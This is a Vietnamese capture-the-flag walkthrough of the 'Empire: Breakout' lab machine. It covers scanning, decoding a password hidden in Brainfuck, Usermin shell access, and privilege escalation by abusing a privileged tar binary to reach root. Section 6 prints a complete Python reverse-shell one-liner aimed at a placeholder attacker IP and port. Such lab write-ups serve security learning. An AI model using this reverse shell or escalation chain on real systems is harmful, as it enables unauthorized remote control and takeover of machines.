# SECURITY ASSESSMENT REPORT – Empire: Breakout

## 1. Reconnaissance

### 1.1. Port Scanning

Trước tiên sử dụng `nmap` để quét các cổng đang mở trên máy chủ mục tiêu:

```bash
nmap -p- -sC -sV <TARGET>
```

![img](img/nmap.png?raw=true)

Kết quả cho thấy cổng `80` đang hoạt động và cung cấp dịch vụ HTTP. Tiến hành truy cập vào web server để kiểm tra ứng dụng.

![img](img/port80.png?raw=true)

---

## 2. Web Enumeration

### 2.1. Directory Enumeration

Tiếp theo sử dụng `Gobuster` để thực hiện directory enumeration nhằm tìm kiếm các đường dẫn và tài nguyên có thể truy cập trên web server:

```bash
gobuster dir -u http://<TARGET>/ \
-w /usr/share/dirb/wordlists/common.txt
```

![img](img/gobuster1.png?raw=true)

Trong kết quả phát hiện một đường dẫn đáng chú ý:

```text
/manual
```

Truy cập vào đường dẫn này cho thấy đây là trang tài liệu của Apache:

![img](img/manual.png?raw=true)

Do `/manual` có thể chứa thêm các tài nguyên khác, tiếp tục thực hiện Gobuster trên đường dẫn này:

```bash
gobuster dir -u http://<TARGET>/manual/ \
-w /usr/share/dirb/wordlists/common.txt
```

![img](img/gobuster2.png?raw=true)

Kết quả chủ yếu chỉ phát hiện các đường dẫn phục vụ chuyển đổi ngôn ngữ của Apache Manual và không phát hiện thêm endpoint đáng chú ý.

---

## 3. Phân tích Source Code

Sau khi directory enumeration không phát hiện thêm thông tin đáng chú ý, tiến hành kiểm tra source HTML của trang web.

![img](img/view_source.png?raw=true)

Trong source phát hiện một đoạn mã được viết bằng **Brainfuck**.

Brainfuck là một esoteric programming language sử dụng một tập hợp rất nhỏ các ký tự để biểu diễn chương trình. Trong trường hợp này, đoạn mã được sử dụng để che giấu một chuỗi ký tự.

Tiến hành decode đoạn mã Brainfuck:

![img](img/decode.png?raw=true)

Kết quả thu được một chuỗi ký tự. Chuỗi này có khả năng là password được sử dụng để đăng nhập vào một dịch vụ trên hệ thống.

Tuy nhiên, tại thời điểm này chưa xác định được username tương ứng.

---

## 4. Username Enumeration

Để tìm kiếm username tồn tại trên hệ thống, sử dụng `enum4linux`:

```bash
enum4linux <TARGET>
```

![img](img/enum4linux.png?raw=true)

Kết quả xác định được username:

```text
cypher
```

Kết hợp username `cypher` với chuỗi password thu được từ quá trình decode Brainfuck, tiến hành đăng nhập vào Usermin.

![img](img/login_success_to_usermin.png?raw=true)

Như vậy, thông tin được ẩn trong source HTML có thể được sử dụng để xác thực vào Usermin.

---

# 5. Initial Access

Sau khi đăng nhập thành công vào Usermin, truy cập chức năng `shell`.

Chức năng này cho phép người dùng thực hiện các command trực tiếp trên máy chủ.

Tiến hành đọc file `user.txt`:

![img](img/user_flag.png?raw=true)

Tại thời điểm này đã có khả năng thực thi command trên hệ thống dưới quyền của user hiện tại.

---

# 6. Establishing Reverse Shell

Để thuận tiện cho quá trình enumeration và privilege escalation, tiến hành thiết lập reverse shell bằng Python:

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

![img](img/reverse_shell.png?raw=true)

Sau khi có interactive shell, tiến hành kiểm tra hệ thống để tìm các cấu hình hoặc file có thể được sử dụng cho privilege escalation.

---

# 7. Local Enumeration

Sử dụng **LinPEAS** để thực hiện enumeration tổng quan hệ thống:

```bash
./linpeas.sh
```

![img](img/linpeassh.png?raw=true)

Trong kết quả quét phát hiện một file đáng chú ý có tên:

```text
old_pass
```

File này nằm trong thư mục backup và user hiện tại không có quyền đọc trực tiếp.

Tiếp tục kiểm tra các file và permission trong thư mục hiện tại:

![img](img/ls.png?raw=true)

Có thể thấy một file `tar` được thiết lập với quyền cao, trong khi user hiện tại vẫn có khả năng thực thi file này.

Đây là một cấu hình không an toàn và có khả năng được sử dụng để truy cập các file mà user hiện tại không có quyền đọc.

---

# 8. Privilege Escalation

Mục tiêu tiếp theo là lợi dụng quyền thực thi của `tar` để đóng gói file `old_pass` vào một archive mà user hiện tại có quyền đọc.

Tiến hành tạo file `pass.tar` chứa `old_pass`:

![img](img/copy.png?raw=true)

Sau khi tạo archive, tiến hành giải nén bằng `tar`:

```bash
tar -xf pass.tar
```

Sau khi giải nén, có thể đọc nội dung của file `old_pass`.

Kết quả thu được một chuỗi ký tự khác. Chuỗi này có khả năng là password của tài khoản `root`:

![img](img/root.png?raw=true)

Sử dụng thông tin thu được để chuyển sang tài khoản `root`.

Kiểm tra quyền hiện tại:

```bash
whoami
```

Kết quả:

```text
root
```

Như vậy quá trình privilege escalation đã thành công.

---

# 9. Root Flag

Sau khi có quyền `root`, truy cập thư mục `/root`:

```bash
cd /root
```

Sau đó đọc root flag:

```bash
cat root.txt
```

Tại thời điểm này, attacker đã có toàn quyền trên hệ thống và có thể truy cập root flag.

---

# 10. Attack Chain

Toàn bộ quá trình khai thác có thể được mô tả như sau:

```text
Nmap
  ↓
Port 80
  ↓
Gobuster
  ↓
/manual
  ↓
Apache Manual
  ↓
View Source
  ↓
Brainfuck
  ↓
Decode Password
  ↓
enum4linux
  ↓
Username: cypher
  ↓
Usermin Login
  ↓
Usermin Shell
  ↓
User Flag
  ↓
Reverse Shell
  ↓
LinPEAS
  ↓
old_pass + privileged tar
  ↓
Tar Abuse
  ↓
Read old_pass
  ↓
Root Password
  ↓
Root Access
  ↓
Root Flag
```